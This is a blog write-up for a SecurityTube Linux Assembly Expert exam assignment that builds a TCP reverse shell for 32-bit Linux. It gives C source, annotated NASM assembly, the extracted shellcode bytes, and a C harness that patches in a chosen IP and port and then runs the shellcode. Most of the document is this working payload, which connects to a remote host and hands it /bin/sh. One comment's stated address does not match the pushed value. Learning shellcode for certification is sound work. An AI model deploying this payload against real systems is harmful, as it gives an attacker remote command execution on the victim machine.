# Assignment 2 - TCP Reverse Shell

It's late. I'm tired. I'm getting the hang of this, but I've just got no time to work on it. There's so much to do and so little space to squeeze it into. It's like my life is being coded on a commodore 64! Alas, the SLAE is still proving to be a fun learning tool, so let's dive in.

## Problem Statement

* Create a Shell_Reverse_TCP shellcode
  - Reverse connects to configured IP and Port
  - Execs shell on successful connection
* IP and Port number should be easily configurable

## Forming a Base

This guide will follow very closely with assignment 1, as the problems are very similar. Let's start off by writing our own C program to do what we want:

**_assignment2.c_**

```c
#include <unistd.h> // dup2, execve
#include <netinet/in.h> // socket structures and constants
#include <arpa/inet.h> // inet_addr

#define RHOST "127.0.0.1"
#define RPORT 4444

int main() {
  int sockfd;
  struct sockaddr_in remote_addr;


  // CREATE SOCKET
  // create a new socket  (ipv4, tcp, tcp)
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


  // CONNECT TO ADDRESS
  // create the address to connect to
  remote_addr.sin_family = AF_INET; // ipv4
  remote_addr.sin_port = htons(RPORT); // port in the correct endianness
  remote_addr.sin_addr.s_addr = inet_addr(RHOST);

  // Connect to the specified address (127.0.0.1:4444)
  connect(sockfd, (struct sockaddr*) &remote_addr, sizeof(remote_addr));


  // CHANGE STD FILE DESCRIPTORS
  // Overwrite old stdin, stdout, stderr fd's with the socket fd
  dup2(sockfd, 0); // stdin
  dup2(sockfd, 1); // stdout
  dup2(sockfd, 2); // stderr


  // EXECVE SHELL
  // Execute the new program /bin/sh, which will now use the socket to
  //  handle it's stdin, stdout, and stderr
  execve("/bin/sh", NULL, NULL);


  // EXIT
  // This will never happen because execve closes out for us.
  return 0;
}
```  


## Initial Research

#### Syscalls

Most of the research has been done as a part of assignment 1. However, I did need to figure out the syscall number of `connect`. It wound up being `362`, or `0x16a`.

To learn how I found the syscall numbers, take a look at the assignment 1 write-up.


## The Final Product

And that's really all that was needed besides some minor code modification. Hopefully, the code can speak for itself. I've tried to keep it well documented.

**_assignment2.asm_**

```asm
; Filename: assignment2.nasm
; Author:  Adam Brown
; Website:  https://coffeegist.com
;
;
; Purpose: Create TCP Reverse Shell for SLAE Exam, Assignment 2

global _start

section .text
_start:

  ; Clear out registers before we get started
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  mul ebx ; zero out eax
  xor esi, esi
  xor edi, edi

; CREATE SOCKET
; int socket(int domain, int type, int protocol) //
; syscall number: 359 (0x167)
;
; Argument Values:
; EBX -> domain = 2 (AF_INET/IPv4)
; ECX -> type = 1 (SOCK_STREAM/TCP)
; EDX -> protocol = 6 (IPPROTO_TCP)
;
; Note: For protocol, we could also use 0, as the man page for socket tells us,
; "Normally only a single protocol exists to support a particular socket type
;   within a given protocol family, in which case protocol can be specified
;   as 0."

  mov bl, 2
  mov cl, 1
  mov dl, 6
  mov ax, 0x167
  int 0x80


; CONNECT TO REMOTE ADDRESS
; int connect (int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; syscall number: 362 (0x16a)
;
; Argument Values:
; sockfd = value in eax returned by socket()
; *addr = memory address of structure containing:
;   - sin_family: 0x0002 (AF_INET/IPv4)
;   - sin_port: 0x115c (4444)
;   - sin_addr.s_addr: 0x0101a8c0 (192.168.1.1)
; addrlen = 0x10 (16/sizeof(sockaddr_in))

  mov ebx, eax ; mov sockfd value into ebx

  push 0x81caa8c0

  push word 0x5c11 ; push 0x115c for sin_port
  push word 0x02 ; push 0x0002 for sin_family

  mov ecx, esp ; memory pointer to our sockaddr struct

  mov dl, 0x10
  mov ax, 0x16a
  int 0x80


; CHANGE STD FILE DESCRIPTORS
; int dup2(int oldfd, int newfd);
; syscall number: 63 (0x3f)
;
; Argument Values:
; oldfd = value in ebx used by connect()
; newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)

  xor ecx, ecx
  mov cl, 3 ; 3 file descriptors (stdin, stdout, stderr)

dup_descriptors:
  dec cl ; hack for loop to work with values 2,1,0 instead of 3,2,1
  mul edx ; zero out eax
  mov al, 0x3f
  int 0x80 ; dup2 stdin
  inc cl ; hack for loop to work with values 2,1,0 instead of 3,2,1
  loop dup_descriptors


; EXECVE SHELL
; int execve(const char *filename, char *const argv[], char *const envp[]);
; syscall number: 11 (0xb)
;
; Argument Values:
; *filename = Memory address of a null terminated string "/bin/sh"
; *argv[] = [*"/bin/sh", 0x00000000]
; *envp = NULL

  xor ecx, ecx

  ; This has to be pushed in reverse because of how things move to the stack
  ; Pushing /bin/sh null terminated string
  push cx
  push dword 0x68732f2f ; push / / s h
  push dword 0x6e69622f ; push / b i n

  mov ebx, esp ; Store pointer to "/bin/sh" in ebx
  push ecx ; Push NULL
  push ebx ; Push *filename
  mov ecx, esp ; Store memory address pointing to memory address of "/bin/sh"
  mov al, 0xb
  int 0x80 ; Execute SHELL


; EXIT
  xor eax, eax
  mov al, 1;
  int 0x80;
```

**_Getting the Shellcode_**

```bash
root@kali:~/courses/slae/exam# nasm -f elf32 -o assignment2.o assignment2.nasm
root@kali:~/courses/slae/exam# ld -o assignment2 assignment2.o

root@kali:~/courses/slae/exam# objdump -d ./assignment2|grep '[0-9a-f]:'|grep
-v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed
's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xdb\x31\xc9\x31\xd2\xf7\xe3\x31\xf6\x31\xff\xb3\x02\xb1\x01\xb2\x06\x66
\xb8\x67\x01\xcd\x80\x89\xc3\x68\xc0\xa8\xca\x81\x66\x68\x11\x5c\x66\x6a\x02\x89
\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xf7\xe2\xb0\x3f\xcd
\x80\xfe\xc1\xe2\xf4\x31\xc9\x66\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89
\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
```


**_shellcode.c_**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h> // inet_addr

#define IP_OFFSET 27
#define PORT_OFFSET 33

int main(int argc, char* argv[]) {
    unsigned char shellcode[] = \
"\x31\xdb\x31\xc9\x31\xd2\xf7\xe3\x31\xf6\x31\xff\xb3\x02\xb1\x01\xb2\x06\x66
\xb8\x67\x01\xcd\x80\x89\xc3\x68\xc0\xa8\xca\x81\x66\x68\x11\x5c\x66\x6a\x02\x89
\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xf7\xe2\xb0\x3f\xcd
\x80\xfe\xc1\xe2\xf4\x31\xc9\x66\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89
\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

    if (argc > 2) {
        printf("Addr: %s\n", argv[1]);
        in_addr_t ip = inet_addr(argv[1]);
        unsigned short porti = htons(atoi(argv[2]));
        memcpy(&shellcode[IP_OFFSET], &ip, 4);
        memcpy(&shellcode[PORT_OFFSET], &porti, 2);
    } else {
        printf("Please enter an IP address and port number!\n");
        printf("Usage: %s <ip-address> <port>\n\n", argv[0]);
        return -1;
    }

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())shellcode;

    ret();
}

```


**_Running our Shellcode_**

```bash
root@kali:~/courses/slae/exam# gcc shellcode.c -o shellcode

root@kali:~/courses/slae/exam# ./shellcode 192.168.1.1 4444
Shellcode Length:  94

```

## Wrap-Up

Now it's time for bed. We have shellcode that successfully connects back to us upon being executed, and presents us with a nice `/bin/sh` shell! I hope you learned something with me this assignment, and if you had any trouble following, go back and look at assignment 1, and/or drop me a comment. Until next time, try harder!


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
